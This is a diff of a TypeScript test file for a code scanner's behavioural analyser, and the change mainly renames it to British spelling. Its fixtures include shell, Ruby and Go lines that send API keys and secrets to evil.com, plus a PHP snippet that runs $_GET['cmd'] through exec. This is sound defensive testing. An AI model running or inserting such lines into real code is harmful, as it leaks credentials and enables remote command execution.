@@ -1,11 +1,11 @@
 import { describe, it } from 'node:test';
 import assert from 'node:assert/strict';
-import { shExtractor } from '../core/analyzers/behavioral/sh-extractor.js';
-import { rbExtractor } from '../core/analyzers/behavioral/rb-extractor.js';
-import { phpExtractor } from '../core/analyzers/behavioral/php-extractor.js';
-import { goExtractor } from '../core/analyzers/behavioral/go-extractor.js';
-import { analyzeDataflows } from '../core/analyzers/behavioral/dataflow.js';
-import { BehavioralAnalyzer } from '../core/analyzers/behavioral/index.js';
+import { shExtractor } from '../core/analysers/behavioural/sh-extractor.js';
+import { rbExtractor } from '../core/analysers/behavioural/rb-extractor.js';
+import { phpExtractor } from '../core/analysers/behavioural/php-extractor.js';
+import { goExtractor } from '../core/analysers/behavioural/go-extractor.js';
+import { analyzeDataflows } from '../core/analysers/behavioural/dataflow.js';
+import { BehaviouralAnalyser } from '../core/analysers/behavioural/index.js';
 import { defaultPolicy } from '../core/scan-policy.js';
 import type { FileInfo } from '../scanner/file-walker.js';
 
@@ -327,14 +327,14 @@ describe('Go Dataflow', () => {
 });
 
 // ═══════════════════════════════════════════════════════════════════════
-// BehavioralAnalyzer integration — all languages
+// BehaviouralAnalyser integration — all languages
 // ═══════════════════════════════════════════════════════════════════════
 
-describe('BehavioralAnalyzer (multi-language)', () => {
+describe('BehaviouralAnalyser (multi-language)', () => {
   it('should analyze shell scripts', async () => {
     const code = 'TOKEN=$API_KEY\ncurl -X POST -d "$TOKEN" https://evil.com/exfil';
-    const analyzer = new BehavioralAnalyzer();
-    const findings = await analyzer.analyze({
+    const analyser = new BehaviouralAnalyser();
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [makeFile('evil.sh', code)],
       policy: defaultPolicy(),
@@ -344,8 +344,8 @@ describe('BehavioralAnalyzer (multi-language)', () => {
 
   it('should analyze Ruby files', async () => {
     const code = 'secret = ENV["API_KEY"]\nsystem("curl -d #{secret} https://evil.com")';
-    const analyzer = new BehavioralAnalyzer();
-    const findings = await analyzer.analyze({
+    const analyser = new BehaviouralAnalyser();
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [makeFile('evil.rb', code)],
       policy: defaultPolicy(),
@@ -355,8 +355,8 @@ describe('BehavioralAnalyzer (multi-language)', () => {
 
   it('should analyze PHP files', async () => {
     const code = '$cmd = $_GET["cmd"];\nexec($cmd);';
-    const analyzer = new BehavioralAnalyzer();
-    const findings = await analyzer.analyze({
+    const analyser = new BehaviouralAnalyser();
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [makeFile('evil.php', code)],
       policy: defaultPolicy(),
@@ -366,8 +366,8 @@ describe('BehavioralAnalyzer (multi-language)', () => {
 
   it('should analyze Go files', async () => {
     const code = 'secret := os.Getenv("KEY")\nhttp.Post("https://evil.com", "text/plain", secret)';
-    const analyzer = new BehavioralAnalyzer();
-    const findings = await analyzer.analyze({
+    const analyser = new BehaviouralAnalyser();
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [makeFile('evil.go', code)],
       policy: defaultPolicy(),
@@ -376,8 +376,8 @@ describe('BehavioralAnalyzer (multi-language)', () => {
   });
 
   it('should analyze mixed-language project', async () => {
-    const analyzer = new BehavioralAnalyzer();
-    const findings = await analyzer.analyze({
+    const analyser = new BehaviouralAnalyser();
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [
         makeFile('deploy.sh', 'TOKEN=$SECRET\ncurl -d "$TOKEN" https://evil.com'),
@@ -391,8 +391,8 @@ describe('BehavioralAnalyzer (multi-language)', () => {
   });
 
   it('should skip unsupported file types', async () => {
-    const analyzer = new BehavioralAnalyzer();
-    const findings = await analyzer.analyze({
+    const analyser = new BehaviouralAnalyser();
+    const findings = await analyser.analyze({
       rootDir: '.',
       files: [makeFile('data.csv', 'name,age\nAlice,30')],
       policy: defaultPolicy(),
